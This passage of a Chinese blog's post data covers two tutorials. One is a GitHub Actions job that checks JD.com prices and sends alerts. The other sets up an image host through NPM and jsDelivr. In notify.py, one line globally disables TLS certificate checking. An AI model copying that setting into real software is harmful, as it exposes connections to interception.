class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span 